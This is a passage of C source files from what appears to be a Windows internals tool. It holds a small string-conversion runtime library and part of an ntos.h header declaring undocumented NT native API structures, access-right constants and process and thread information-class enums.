#define u64tohex u64tohex_a

#define strtoul strtoul_a
#define hextoul hextoul_a
#define strtoi strtoi_a
#define strtoi64 strtoi64_a
#define strtou64 strtou64_a
#define hextou64 hextou64_a

#endif

#endif /* _MINIRTL_ */

```

`source/ApiSetSchema/minirtl/rtltypes.h`:

```h
#ifndef _WCHAR_T_DEFINED
typedef unsigned short wchar_t;
#define _WCHAR_T_DEFINED
#endif  /* _WCHAR_T_DEFINED */

#ifndef _SIZE_T_DEFINED
#ifdef _WIN64
typedef unsigned __int64    size_t;
#else  /* _WIN64 */
typedef __w64 unsigned int   size_t;
#endif  /* _WIN64 */
#define _SIZE_T_DEFINED
#endif  /* _SIZE_T_DEFINED */

__forceinline char locase_a(char c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline wchar_t locase_w(wchar_t c)
{
	if ((c >= 'A') && (c <= 'Z'))
		return c + 0x20;
	else
		return c;
}

__forceinline char byteabs(char x) {
	if (x < 0)
		return -x;
	return x;
}

__forceinline int _isdigit_a(char x) {
	return ((x >= '0') && (x <= '9'));
}

__forceinline int _isdigit_w(wchar_t x) {
	return ((x >= L'0') && (x <= L'9'));
}

```

`source/ApiSetSchema/minirtl/ultostr.c`:

```c
#include "rtltypes.h"

size_t ultostr_a(unsigned long x, char *s)
{
	unsigned long	t=x;
	size_t			i, r=1;

	while ( t >= 10 ) {
		t /= 10;
		r++;
	}

	if (s == 0)
		return r;
	
	for (i = r; i != 0; i--) {
		s[i-1] = (char)(x % 10) + '0';
		x /= 10;
	}

	s[r] = (char)0;
	return r;
}

size_t ultostr_w(unsigned long x, wchar_t *s)
{
	unsigned long	t=x;
	size_t			i, r=1;

	while ( t >= 10 ) {
		t /= 10;
		r++;
	}

	if (s == 0)
		return r;
	
	for (i = r; i != 0; i--) {
		s[i-1] = (wchar_t)(x % 10) + L'0';
		x /= 10;
	}

	s[r] = (wchar_t)0;
	return r;
}

```

`source/ApiSetSchema/ntos.h`:

```h
/************************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2018, translated from Microsoft sources/debugger
*
*  TITLE:       NTOS.H
*
*  VERSION:     1.92
*
*  DATE:        24 Oct 2018
*
*  Common header file for the ntos API functions and definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
************************************************************************************/

#ifndef NTOS_RTL
#define NTOS_RTL

#pragma comment(lib, "ntdll.lib")

#pragma warning(push)
#pragma warning(disable: 4214) // nonstandard extension used : bit field types other than int

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000ull
#endif

typedef CCHAR KPROCESSOR_MODE;
typedef UCHAR KIRQL;
typedef KIRQL *PKIRQL;

#ifndef IN_REGION
#define IN_REGION(x, Base, Size) (((ULONG_PTR)(x) >= (ULONG_PTR)(Base)) && \
            ((ULONG_PTR)(x) <= (ULONG_PTR)(Base) + (ULONG_PTR)(Size)))
#endif

//
// Define alignment macros to align structure sizes and pointers up and down.
//

#ifndef ALIGN_UP_TYPE
#define ALIGN_UP_TYPE(Address, Align) (((ULONG_PTR)(Address) + (Align) - 1) & ~((Align) - 1))
#endif

#ifndef ALIGN_UP
#define ALIGN_UP(Address, Type) ALIGN_UP_TYPE(Address, sizeof(Type))
#endif

#ifndef ALIGN_DOWN_TYPE
#define ALIGN_DOWN_TYPE(Address, Align) ((ULONG_PTR)(Address) & ~((ULONG_PTR)(Align) - 1))
#endif

#ifndef ALIGN_DOWN
#define ALIGN_DOWN(Address, Type) ALIGN_DOWN_TYPE(Address, sizeof(Type))
#endif

#ifndef ALIGN_UP_BY
#define ALIGN_UP_BY(Address, Align) (((ULONG_PTR)(Address) + (Align) - 1) & ~((Align) - 1))
#endif

#ifndef ALIGN_DOWN_BY
#define ALIGN_DOWN_BY(Address, Align) ((ULONG_PTR)(Address) & ~((ULONG_PTR)(Align) - 1))
#endif

#ifndef ALIGN_UP_POINTER_BY
#define ALIGN_UP_POINTER_BY(Pointer, Align) ((PVOID)ALIGN_UP_BY(Pointer, Align))
#endif

#ifndef ALIGN_DOWN_POINTER_BY
#define ALIGN_DOWN_POINTER_BY(Pointer, Align) ((PVOID)ALIGN_DOWN_BY(Pointer, Align))
#endif

#ifndef ALIGN_UP_POINTER
#define ALIGN_UP_POINTER(Pointer, Type) ((PVOID)ALIGN_UP(Pointer, Type))
#endif

#ifndef ALIGN_DOWN_POINTER
#define ALIGN_DOWN_POINTER(Pointer, Type) ((PVOID)ALIGN_DOWN(Pointer, Type))
#endif

#ifndef ARGUMENT_PRESENT
#define ARGUMENT_PRESENT(ArgumentPointer)    (\
    (CHAR *)((ULONG_PTR)(ArgumentPointer)) != (CHAR *)(NULL) )
#endif

#ifndef LOGICAL
#define LOGICAL ULONG
#endif

#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define ZwCurrentProcess() NtCurrentProcess()
#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)
#define ZwCurrentThread() NtCurrentThread()
#define NtCurrentSession() ((HANDLE)(LONG_PTR)-3)
#define ZwCurrentSession() NtCurrentSession()

//Valid Only for Windows 8+
#define NtCurrentProcessToken() ((HANDLE)(LONG_PTR)-4) 
#define NtCurrentThreadToken() ((HANDLE)(LONG_PTR)-5)
#define NtCurrentEffectiveToken() ((HANDLE)(LONG_PTR)-6)

//
// ntdef.h begin
//
#ifndef RTL_CONSTANT_STRING
char _RTL_CONSTANT_STRING_type_check(const void *s);
#define _RTL_CONSTANT_STRING_remove_const_macro(s) (s)
#define RTL_CONSTANT_STRING(s) \
{ \
    sizeof( s ) - sizeof( (s)[0] ), \
    sizeof( s ) / sizeof(_RTL_CONSTANT_STRING_type_check(s)), \
    _RTL_CONSTANT_STRING_remove_const_macro(s) \
}
#endif

#define RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a) \
    { sizeof(OBJECT_ATTRIBUTES), NULL, RTL_CONST_CAST(PUNICODE_STRING)(n), a, NULL, NULL }

// This synonym is more appropriate for initializing what isn't actually const.
#define RTL_INIT_OBJECT_ATTRIBUTES(n, a) RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a)

//
// ntdef.h end
//

#define RtlOffsetToPointer(Base, Offset)  ((PCHAR)( ((PCHAR)(Base)) + ((ULONG_PTR)(Offset))  ))
#define RtlPointerToOffset(Base, Pointer)  ((ULONG)( ((PCHAR)(Pointer)) - ((PCHAR)(Base))  ))

typedef ULONG CLONG;
typedef LONG KPRIORITY;
typedef short CSHORT;
typedef ULONGLONG REGHANDLE, *PREGHANDLE;
typedef PVOID *PDEVICE_MAP;
typedef PVOID PHEAD;

#if defined(_WIN64)
typedef ULONG SYSINF_PAGE_COUNT;
#else
typedef SIZE_T SYSINF_PAGE_COUNT;
#endif

//
// Valid values for the OBJECT_ATTRIBUTES.Attributes field
//
#define OBJ_INHERIT             0x00000002L
#define OBJ_PERMANENT           0x00000010L
#define OBJ_EXCLUSIVE           0x00000020L
#define OBJ_CASE_INSENSITIVE    0x00000040L
#define OBJ_OPENIF              0x00000080L
#define OBJ_OPENLINK            0x00000100L
#define OBJ_KERNEL_HANDLE       0x00000200L
#define OBJ_FORCE_ACCESS_CHECK  0x00000400L
#define OBJ_VALID_ATTRIBUTES    0x000007F2L

//
// Callback Object Rights
//
#define CALLBACK_MODIFY_STATE    0x0001
#define CALLBACK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|CALLBACK_MODIFY_STATE )

//
// Debug Object Access Rights
//
#define DEBUG_READ_EVENT        (0x0001)
#define DEBUG_PROCESS_ASSIGN    (0x0002)
#define DEBUG_SET_INFORMATION   (0x0004)
#define DEBUG_QUERY_INFORMATION (0x0008)
#define DEBUG_ALL_ACCESS     (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|DEBUG_READ_EVENT|DEBUG_PROCESS_ASSIGN|\
                              DEBUG_SET_INFORMATION|DEBUG_QUERY_INFORMATION)

//
// Directory Object Access Rights
//
#define DIRECTORY_QUERY                 (0x0001)
#define DIRECTORY_TRAVERSE              (0x0002)
#define DIRECTORY_CREATE_OBJECT         (0x0004)
#define DIRECTORY_CREATE_SUBDIRECTORY   (0x0008)
#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0xF)

//
// Event Object Access Rights
//
#define EVENT_QUERY_STATE       0x0001
#define EVENT_MODIFY_STATE      0x0002  
#define EVENT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3) 

//
// EventPair Object Access Rights
//
#define EVENT_PAIR_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE)

//
// I/O Completion Object Access Rights
//
#define IO_COMPLETION_QUERY_STATE   0x0001
#define IO_COMPLETION_MODIFY_STATE  0x0002  
#define IO_COMPLETION_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3) 

//
// KeyedEvent Object Access Rights
//
#define KEYEDEVENT_WAIT 0x0001
#define KEYEDEVENT_WAKE 0x0002
#define KEYEDEVENT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | KEYEDEVENT_WAIT | KEYEDEVENT_WAKE)

//
// Mutant Object Access Rights
//
#define MUTANT_QUERY_STATE      0x0001
#define MUTANT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|MUTANT_QUERY_STATE)

//
// Port Object Access Rights
//
#define PORT_CONNECT (0x0001)
#define PORT_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0x1)

//
// Profile Object Access Rights
//
#define PROFILE_CONTROL (0x0001)
#define PROFILE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | PROFILE_CONTROL)

//
// Semaphore Object Access Rights
//
#define SEMAPHORE_QUERY_STATE       0x0001
#define SEMAPHORE_MODIFY_STATE      0x0002 
#define SEMAPHORE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3)

//
// SymbolicLink Object Access Rights
//
#define SYMBOLIC_LINK_QUERY (0x0001)
#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

//
// Thread Object Access Rights
//
#define THREAD_ALERT	(0x0004)

#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001
#define THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH 0x00000002 
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER 0x00000004
#define THREAD_CREATE_FLAGS_HAS_SECURITY_DESCRIPTOR 0x00000010 
#define THREAD_CREATE_FLAGS_ACCESS_CHECK_IN_TARGET 0x00000020 
#define THREAD_CREATE_FLAGS_INITIAL_THREAD 0x00000080

//
// Worker Factory Object Access Rights
//
#define WORKER_FACTORY_RELEASE_WORKER 0x0001
#define WORKER_FACTORY_WAIT 0x0002
#define WORKER_FACTORY_SET_INFORMATION 0x0004
#define WORKER_FACTORY_QUERY_INFORMATION 0x0008
#define WORKER_FACTORY_READY_WORKER 0x0010
#define WORKER_FACTORY_SHUTDOWN 0x0020

#define WORKER_FACTORY_ALL_ACCESS ( \
    STANDARD_RIGHTS_REQUIRED | \
    WORKER_FACTORY_RELEASE_WORKER | \
    WORKER_FACTORY_WAIT | \
    WORKER_FACTORY_SET_INFORMATION | \
    WORKER_FACTORY_QUERY_INFORMATION | \
    WORKER_FACTORY_READY_WORKER | \
    WORKER_FACTORY_SHUTDOWN \
    )

//
// Type Object Access Rights
//
#define OBJECT_TYPE_CREATE (0x0001)
#define OBJECT_TYPE_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)

//
// WMI Object Access Rights
//
#define WMIGUID_QUERY                 0x0001
#define WMIGUID_SET                   0x0002
#define WMIGUID_NOTIFICATION          0x0004
#define WMIGUID_READ_DESCRIPTION      0x0008
#define WMIGUID_EXECUTE               0x0010
#define TRACELOG_CREATE_REALTIME      0x0020
#define TRACELOG_CREATE_ONDISK        0x0040
#define TRACELOG_GUID_ENABLE          0x0080
#define TRACELOG_ACCESS_KERNEL_LOGGER 0x0100
#define TRACELOG_CREATE_INPROC        0x0200
#define TRACELOG_ACCESS_REALTIME      0x0400
#define TRACELOG_REGISTER_GUIDS       0x0800

//
// Memory Partition Object Access Rights
//
#define MEMORY_PARTITION_QUERY_ACCESS  0x0001
#define MEMORY_PARTITION_MODIFY_ACCESS 0x0002

#define MEMORY_PARTITION_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED |         \
                                     SYNCHRONIZE |                      \
                                     MEMORY_PARTITION_QUERY_ACCESS |    \
                                     MEMORY_PARTITION_MODIFY_ACCESS)

//
// NtCreateProcessEx specific flags.
//
#define PS_REQUEST_BREAKAWAY        1
#define PS_NO_DEBUG_INHERIT         2
#define PS_INHERIT_HANDLES          4
#define PS_LARGE_PAGES              8
#define PS_ALL_FLAGS                (PS_REQUEST_BREAKAWAY | \
                                     PS_NO_DEBUG_INHERIT  | \
                                     PS_INHERIT_HANDLES   | \
                                     PS_LARGE_PAGES)

//
// Define special ByteOffset parameters for read and write operations
//
#define FILE_WRITE_TO_END_OF_FILE       0xffffffff
#define FILE_USE_FILE_POINTER_POSITION  0xfffffffe

//
// This is the maximum MaximumLength for a UNICODE_STRING.
//
#define MAXUSHORT   0xffff     
#define MAX_USTRING ( sizeof(WCHAR) * (MAXUSHORT/sizeof(WCHAR)) )

typedef struct _EX_RUNDOWN_REF {
    union
    {
        ULONG Count;
        PVOID Ptr;
    };
} EX_RUNDOWN_REF, *PEX_RUNDOWN_REF;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING;
typedef UNICODE_STRING *PUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;

#ifndef STATIC_UNICODE_STRING
#define STATIC_UNICODE_STRING(string, value) \
  static UNICODE_STRING string = { sizeof(value) - sizeof(WCHAR), sizeof(value), value };
#endif

typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} STRING;
typedef STRING *PSTRING;

typedef STRING ANSI_STRING;
typedef PSTRING PANSI_STRING;

typedef STRING OEM_STRING;
typedef PSTRING POEM_STRING;
typedef CONST STRING* PCOEM_STRING;
typedef CONST char *PCSZ;

typedef struct _CSTRING {
    USHORT Length;
    USHORT MaximumLength;
    CONST char *Buffer;
} CSTRING;
typedef CSTRING *PCSTRING;
#define ANSI_NULL ((CHAR)0)

typedef STRING CANSI_STRING;
typedef PSTRING PCANSI_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef OBJECT_ATTRIBUTES *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;

    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

/*
** FileCache and MemoryList START
*/

typedef enum _SYSTEM_MEMORY_LIST_COMMAND {
    MemoryCaptureAccessedBits,
    MemoryCaptureAndResetAccessedBits,
    MemoryEmptyWorkingSets,
    MemoryFlushModifiedList,
    MemoryPurgeStandbyList,
    MemoryPurgeLowPriorityStandbyList,
    MemoryCommandMax
} SYSTEM_MEMORY_LIST_COMMAND;

typedef struct _SYSTEM_FILECACHE_INFORMATION {
    SIZE_T CurrentSize;
    SIZE_T PeakSize;
    ULONG PageFaultCount;
    SIZE_T MinimumWorkingSet;
    SIZE_T MaximumWorkingSet;
    SIZE_T CurrentSizeIncludingTransitionInPages;
    SIZE_T PeakSizeIncludingTransitionInPages;
    ULONG TransitionRePurposeCount;
    ULONG Flags;
} SYSTEM_FILECACHE_INFORMATION, *PSYSTEM_FILECACHE_INFORMATION;

/*
** FileCache and MemoryList END
*/

/*
** Processes START
*/

typedef struct _SYSTEM_TIMEOFDAY_INFORMATION {
    LARGE_INTEGER BootTime;
    LARGE_INTEGER CurrentTime;
    LARGE_INTEGER TimeZoneBias;
    ULONG TimeZoneId;
    ULONG Reserved;
    ULONGLONG BootTimeBias;
    ULONGLONG SleepTimeBias;
} SYSTEM_TIMEOFDAY_INFORMATION, *PSYSTEM_TIMEOFDAY_INFORMATION;

typedef enum _THREAD_STATE {
    StateInitialized,
    StateReady,
    StateRunning,
    StateStandby,
    StateTerminated,
    StateWait,
    StateTransition,
    StateUnknown
} THREAD_STATE;

typedef enum _KWAIT_REASON {
    Executive,
    FreePage,
    PageIn,
    PoolAllocation,
    DelayExecution,
    Suspended,
    UserRequest,
    WrExecutive,
    WrFreePage,
    WrPageIn,
    WrPoolAllocation,
    WrDelayExecution,
    WrSuspended,
    WrUserRequest,
    WrEventPair,
    WrQueue,
    WrLpcReceive,
    WrLpcReply,
    WrVirtualMemory,
    WrPageOut,
    WrRendezvous,
    WrKeyedEvent,
    WrTerminated,
    WrProcessInSwap,
    WrCpuRateControl,
    WrCalloutStack,
    WrKernel,
    WrResource,
    WrPushLock,
    WrMutex,
    WrQuantumEnd,
    WrDispatchInt,
    WrPreempted,
    WrYieldExecution,
    WrFastMutex,
    WrGuardedMutex,
    WrRundown,
    WrAlertByThreadId,
    WrDeferredPreempt,
    MaximumWaitReason
} KWAIT_REASON;

typedef VOID KSTART_ROUTINE(
    _In_ PVOID StartContext
);
typedef KSTART_ROUTINE *PKSTART_ROUTINE;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _CLIENT_ID64 {
    ULONG64 UniqueProcess;
    ULONG64 UniqueThread;
} CLIENT_ID64, *PCLIENT_ID64;

typedef struct _CLIENT_ID32 {
    ULONG32 UniqueProcess;
    ULONG32 UniqueThread;
} CLIENT_ID32, *PCLIENT_ID32;

typedef struct _VM_COUNTERS {
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
} VM_COUNTERS;

typedef struct _SYSTEM_THREAD_INFORMATION {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    KPRIORITY Priority;
    KPRIORITY BasePriority;
    ULONG ContextSwitchCount;
    THREAD_STATE State;
    KWAIT_REASON WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION {
    SYSTEM_THREAD_INFORMATION ThreadInfo;
    PVOID StackBase;
    PVOID StackLimit;
    PVOID Win32StartAddress;
    PVOID TebBase;
    ULONG_PTR Reserved2;
    ULONG_PTR Reserved3;
    ULONG_PTR Reserved4;
} SYSTEM_EXTENDED_THREAD_INFORMATION, *PSYSTEM_EXTENDED_THREAD_INFORMATION;

typedef struct _SYSTEM_PROCESSES_INFORMATION {
    ULONG NextEntryDelta;
    ULONG ThreadCount;
    LARGE_INTEGER SpareLi1;
    LARGE_INTEGER SpareLi2;
    LARGE_INTEGER SpareLi3;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR PageDirectoryBase;
    VM_COUNTERS VmCounters;
    IO_COUNTERS IoCounters;
    SYSTEM_THREAD_INFORMATION Threads[1];
} SYSTEM_PROCESSES_INFORMATION, *PSYSTEM_PROCESSES_INFORMATION;

typedef enum _SYSTEM_PROCESS_CLASSIFICATION {
    SystemProcessClassificationNormal,
    SystemProcessClassificationSystem,
    SystemProcessClassificationSecureSystem,
    SystemProcessClassificationMemCompression,
    SystemProcessClassificationRegistry,
    SystemProcessClassificationMaximum
} SYSTEM_PROCESS_CLASSIFICATION;

typedef struct _PROCESS_DISK_COUNTERS {
    ULONGLONG BytesRead;
    ULONGLONG BytesWritten;
    ULONGLONG ReadOperationCount;
    ULONGLONG WriteOperationCount;
    ULONGLONG FlushOperationCount;
} PROCESS_DISK_COUNTERS, *PPROCESS_DISK_COUNTERS;

typedef union _ENERGY_STATE_DURATION {
    union
    {
        ULONGLONG Value;
        ULONG LastChangeTime;
    };

    ULONG Duration : 31;
    ULONG IsInState : 1;
} ENERGY_STATE_DURATION, *PENERGY_STATE_DURATION;

typedef struct _PROCESS_ENERGY_VALUES {
    ULONGLONG Cycles[2][4];
    ULONGLONG DiskEnergy;
    ULONGLONG NetworkTailEnergy;
    ULONGLONG MBBTailEnergy;
    ULONGLONG NetworkTxRxBytes;
    ULONGLONG MBBTxRxBytes;
    union
    {
        ENERGY_STATE_DURATION Durations[3];
        struct
        {
            ENERGY_STATE_DURATION ForegroundDuration;
            ENERGY_STATE_DURATION DesktopVisibleDuration;
            ENERGY_STATE_DURATION PSMForegroundDuration;
        };
    };
    ULONG CompositionRendered;
    ULONG CompositionDirtyGenerated;
    ULONG CompositionDirtyPropagated;
    ULONG Reserved1;
    ULONGLONG AttributedCycles[4][2];
    ULONGLONG WorkOnBehalfCycles[4][2];
} PROCESS_ENERGY_VALUES, *PPROCESS_ENERGY_VALUES;

typedef struct _SYSTEM_PROCESS_INFORMATION_EXTENSION {
    PROCESS_DISK_COUNTERS DiskCounters;
    ULONGLONG ContextSwitches;
    union
    {
        ULONG Flags;
        struct
        {
            ULONG HasStrongId : 1;
            ULONG Classification : 4; // SYSTEM_PROCESS_CLASSIFICATION
            ULONG BackgroundActivityModerated : 1;
            ULONG Spare : 26;
        };
    };
    ULONG UserSidOffset;
    ULONG PackageFullNameOffset;
    PROCESS_ENERGY_VALUES EnergyValues;
    ULONG AppIdOffset;
    SIZE_T SharedCommitCharge;
    ULONG JobObjectId;
    ULONG SpareUlong;
    ULONGLONG ProcessSequenceNumber;
} SYSTEM_PROCESS_INFORMATION_EXTENSION, *PSYSTEM_PROCESS_INFORMATION_EXTENSION;

typedef struct _SYSTEM_PROCESSES_FULL_INFORMATION {
    SYSTEM_PROCESSES_INFORMATION ProcessAndThreads;
    SYSTEM_PROCESS_INFORMATION_EXTENSION ExtendedInfo;
} SYSTEM_PROCESSES_FULL_INFORMATION, *PSYSTEM_PROCESSES_FULL_INFORMATION; 

typedef struct _SYSTEM_SECUREBOOT_INFORMATION {
    BOOLEAN SecureBootEnabled;
    BOOLEAN SecureBootCapable;
} SYSTEM_SECUREBOOT_INFORMATION, *PSYSTEM_SECUREBOOT_INFORMATION;

typedef struct _SYSTEM_SECUREBOOT_POLICY_INFORMATION {
    GUID PolicyPublisher;
    ULONG PolicyVersion;
    ULONG PolicyOptions;
} SYSTEM_SECUREBOOT_POLICY_INFORMATION, *PSYSTEM_SECUREBOOT_POLICY_INFORMATION;

typedef struct _SYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION {
    SYSTEM_SECUREBOOT_POLICY_INFORMATION PolicyInformation;
    ULONG PolicySize;
    UCHAR Policy[1];
} SYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION, *PSYSTEM_SECUREBOOT_POLICY_FULL_INFORMATION;

typedef struct _SYSTEM_BASIC_INFORMATION {
    ULONG Reserved;
    ULONG TimerResolution;
    ULONG PageSize;
    SYSINF_PAGE_COUNT NumberOfPhysicalPages;
    SYSINF_PAGE_COUNT LowestPhysicalPageNumber;
    SYSINF_PAGE_COUNT HighestPhysicalPageNumber;
    ULONG AllocationGranularity;
    ULONG_PTR MinimumUserModeAddress;
    ULONG_PTR MaximumUserModeAddress;
    ULONG_PTR ActiveProcessorsAffinityMask;
    CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, *PSYSTEM_BASIC_INFORMATION;

typedef struct _SYSTEM_ISOLATED_USER_MODE_INFORMATION {
    BOOLEAN SecureKernelRunning : 1;
    BOOLEAN HvciEnabled : 1;
    BOOLEAN HvciStrictMode : 1;
    BOOLEAN DebugEnabled : 1;
    BOOLEAN FirmwarePageProtection : 1;
    BOOLEAN SpareFlags : 1;
    BOOLEAN TrustletRunning : 1;
    BOOLEAN SpareFlags2 : 1;
    BOOLEAN Spare0[6];
    ULONGLONG Spare1;
} SYSTEM_ISOLATED_USER_MODE_INFORMATION, *PSYSTEM_ISOLATED_USER_MODE_INFORMATION;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessQuotaLimits = 1,
    ProcessIoCounters = 2,
    ProcessVmCounters = 3,
    ProcessTimes = 4,
    ProcessBasePriority = 5,
    ProcessRaisePriority = 6,
    ProcessDebugPort = 7,
    ProcessExceptionPort = 8,
    ProcessAccessToken = 9,
    ProcessLdtInformation = 10,
    ProcessLdtSize = 11,
    ProcessDefaultHardErrorMode = 12,
    ProcessIoPortHandlers = 13,
    ProcessPooledUsageAndLimits = 14,
    ProcessWorkingSetWatch = 15,
    ProcessUserModeIOPL = 16,
    ProcessEnableAlignmentFaultFixup = 17,
    ProcessPriorityClass = 18,
    ProcessWx86Information = 19,
    ProcessHandleCount = 20,
    ProcessAffinityMask = 21,
    ProcessPriorityBoost = 22,
    ProcessDeviceMap = 23,
    ProcessSessionInformation = 24,
    ProcessForegroundInformation = 25,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessLUIDDeviceMapsEnabled = 28,
    ProcessBreakOnTermination = 29,
    ProcessDebugObjectHandle = 30,
    ProcessDebugFlags = 31,
    ProcessHandleTracing = 32,
    ProcessIoPriority = 33,
    ProcessExecuteFlags = 34,
    ProcessTlsInformation = 35,
    ProcessCookie = 36,
    ProcessImageInformation = 37,
    ProcessCycleTime = 38,
    ProcessPagePriority = 39,
    ProcessInstrumentationCallback = 40,
    ProcessThreadStackAllocation = 41,
    ProcessWorkingSetWatchEx = 42,
    ProcessImageFileNameWin32 = 43,
    ProcessImageFileMapping = 44,
    ProcessAffinityUpdateMode = 45,
    ProcessMemoryAllocationMode = 46,
    ProcessGroupInformation = 47,
    ProcessTokenVirtualizationEnabled = 48,
    ProcessOwnerInformation = 49,
    ProcessWindowInformation = 50,
    ProcessHandleInformation = 51,
    ProcessMitigationPolicy = 52,
    ProcessDynamicFunctionTableInformation = 53,
    ProcessHandleCheckingMode = 54,
    ProcessKeepAliveCount = 55,
    ProcessRevokeFileHandles = 56,
    ProcessWorkingSetControl = 57,
    ProcessHandleTable = 58,
    ProcessCheckStackExtentsMode = 59,
    ProcessCommandLineInformation = 60,
    ProcessProtectionInformation = 61,
    ProcessMemoryExhaustion = 62,
    ProcessFaultInformation = 63,
    ProcessTelemetryIdInformation = 64,
    ProcessCommitReleaseInformation = 65,
    ProcessDefaultCpuSetsInformation = 66,
    ProcessAllowedCpuSetsInformation = 67,
    ProcessSubsystemProcess = 68,
    ProcessJobMemoryInformation = 69,
    ProcessInPrivate = 70,
    ProcessRaiseUMExceptionOnInvalidHandleClose = 71,
    ProcessIumChallengeResponse = 72,
    ProcessChildProcessInformation = 73,
    ProcessHighGraphicsPriorityInformation = 74,
    ProcessSubsystemInformation = 75,
    ProcessEnergyValues = 76,
    ProcessActivityThrottleState = 77,
    ProcessActivityThrottlePolicy = 78,
    ProcessWin32kSyscallFilterInformation = 79,
    ProcessDisableSystemAllowedCpuSets = 80,
    ProcessWakeInformation = 81,
    ProcessEnergyTrackingState = 82,
    ProcessManageWritesToExecutableMemory = 83,
    ProcessCaptureTrustletLiveDump = 84,
    ProcessTelemetryCoverage = 85,
    ProcessEnclaveInformation = 86,
    ProcessEnableReadWriteVmLogging = 87,
    ProcessUptimeInformation = 88,
    ProcessImageSection = 89,
    ProcessDebugAuthInformation = 90,
    ProcessSystemResourceManagement = 91,
    ProcessSequenceNumber = 92,
    ProcessLoaderDetour = 93,
    ProcessSecurityDomainInformation = 93,
    ProcessCombineSecurityDomainsInformation = 94,
    ProcessEnableLogging = 95,
    ProcessLeapSecondInformation = 96,
    MaxProcessInfoClass
} PROCESSINFOCLASS;

typedef enum _THREADINFOCLASS {
    ThreadBasicInformation,
    ThreadTimes,
    ThreadPriority,
    ThreadBasePriority,
    ThreadAffinityMask,
    ThreadImpersonationToken,
    ThreadDescriptorTableEntry,
    ThreadEnableAlignmentFaultFixup,
    ThreadEventPair,
    ThreadQuerySetWin32StartAddress,
    ThreadZeroTlsCell,
    ThreadPerformanceCount,
    ThreadAmILastThread,
    ThreadIdealProcessor,
    ThreadPriorityBoost,
    ThreadSetTlsArrayAddress,
    ThreadIsIoPending,
    ThreadHideFromDebugger,
    ThreadBreakOnTermination,
    ThreadSwitchLegacyState,
    ThreadIsTerminated,
    ThreadLastSystemCall,
    ThreadIoPriority,
    ThreadCycleTime,
    ThreadPagePriority,
    ThreadActualBasePriority,
    ThreadTebInformation,
    ThreadCSwitchMon,
    ThreadCSwitchPmu,
    ThreadWow64Context,
    ThreadGroupInformation,
    ThreadUmsInformation,
    ThreadCounterProfiling,
    ThreadIdealProcessorEx,
    ThreadCpuAccountingInformation,
    ThreadSuspendCount,
